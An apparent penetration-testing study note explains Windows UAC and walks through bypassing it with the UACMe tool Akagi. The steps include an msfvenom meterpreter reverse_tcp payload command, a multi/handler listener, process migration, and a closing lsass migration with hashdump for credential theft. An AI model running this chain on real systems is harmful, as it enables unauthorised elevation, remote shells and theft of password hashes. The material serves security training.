
### What is UAC ?

UAC (User Access Control)

- User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prevent unauthorised changes from being made to the operating system.

- UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrators group.

- A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, whereas a privileged user will be prompted with a consent prompt.

- Attacks can bypass UAC in order to execute malicious executables with elevated privileges.

### Bypassing UAC

- In order to successfully bypass UAC, we will need to have access to a user account that is a part of the local administrators group on the Windows target system. 

- UAC allows a program to be executed with administrative privileges, consequently prompting the user for confirmation.

- UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation. 

- There are multiple tools and techniques that can be used to bypass UAC, however, the tool and technique used will depend on the version of Windows running on the target system.

### What is `UACMe` ?

- UACMe is an open source, robust privilege escalation tool developed by @hfireOx. It can be used to bypass Windows UAC by leveraging various techniques. 

	+ GitHub: https://github.com/hfiref0x/UACME

- The UACME GitHub repository contains a very well documented list of methods that can be used to bypass UAC on multiple versions of Windows ranging from Windows 7 to Windows 10.

- It allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuilt Windows AuteElevate tool. 

- The UACMe GitHub repository has more than 60 exploits that can be used to bypass UAC depending on the version of Windows running on the target.

### How to use `UACMe` ?

- __Prerequisites__
	+ The actual executable to perform the UAC bypass is called `Akagi`, it doesn't comes pre-compiled in the repository as it'll be flagged malicious, therefore we need to compile it ourselves.
	+ In order to elevate privileges by bypassing UAC, we will need access to a user that is a member of the local administrators group. Use command - `net local administrators` to check the list of local administrators.


__STEPS__
1) Gain initial access to a target system
2) If the `meterpreter` session is running in a 32 bit process, we can migrate to a 64 bit process such as `explorer.exe` with PID of 2448. Command is `migrate 2448`.
	+ The process ID of explorer can be found using the command `ps -S explorer.exe`.
	+ Process migration is used for evasion, persistence, stealth and architecture matching.
	+ The original process that the attacker used to gain access to the system is different from the process they inject their code into.
3) We can check the privileges of the current user using `getprivs`
4) Generate a `msfvenom` `meterpreter` payload.
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe > payload.exe
```
5) Setup the multi handler to listen for connections. `use multi/handler`
6) Go back to the `meterpreter` session and navigate to the Temp directory of the target. `cd %TEMP%`
7) Temp directory is in `C:\Users\<user>\AppData\Local\Temp\`
8) Upload the `payload.exe` and `Akagi64.exe` files into the Temp directory. 
9) `shell` into the system and execute `Akagi64.exe`. 
```
.\Akagi64.exe <key_number> <path_to_payload>
```
10) Make sure to provide the full path to the payload.
11) After executing this command, `Akagi` will execute the payload with administrative privileges. And we should receive an elevated `meterpreter` session in our listener.
12) We can then migrate to `lsass.exe` and perform `hashdump`.